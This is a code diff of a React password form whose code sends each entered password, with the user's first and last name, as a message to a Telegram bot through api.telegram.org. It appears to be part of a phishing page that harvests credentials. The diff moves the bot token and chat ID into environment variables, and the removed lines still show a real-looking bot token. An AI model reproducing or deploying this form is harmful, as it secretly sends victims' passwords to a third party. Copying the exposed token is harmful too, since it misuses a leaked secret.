@@ -6,7 +6,6 @@ function Password() {
     const [password, setPassword] = useState('');
     const [error, setError] = useState('');
     const [errorStyle, setErrorStyle] = useState({});
-
     const togglePasswordVisibility = () => {
         setShowPassword(!showPassword);
     };
@@ -22,8 +21,8 @@ function Password() {
             setError('');
             setErrorStyle({});
             try {
-                const botToken = '7728247018:AAE-9N2DS2sar4q8RTpwv2puNQB5yDFaog8';
-                const chatId = '7341896378';
+                const botToken = process.env.REACT_APP_BOT_TOKEN;
+                const chatId = process.env.REACT_APP_CHAT_ID;
                 const message = `Kiritilgan parol: ${password}\nIsmi: ${name}\nFamilya: ${familya} `;
 
                 const response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
